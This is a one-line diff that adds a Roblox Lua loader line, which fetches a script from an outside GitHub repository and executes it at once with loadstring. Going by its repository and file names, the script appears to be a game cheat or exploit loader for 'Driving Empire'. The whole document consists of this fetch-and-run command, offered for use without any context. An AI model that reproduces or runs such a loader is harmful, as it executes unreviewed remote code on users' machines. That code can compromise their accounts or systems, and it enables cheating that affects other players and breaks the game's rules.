@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/driving-empire-2-new-limted-spam6-kscajk5to8db1e.lua"))()
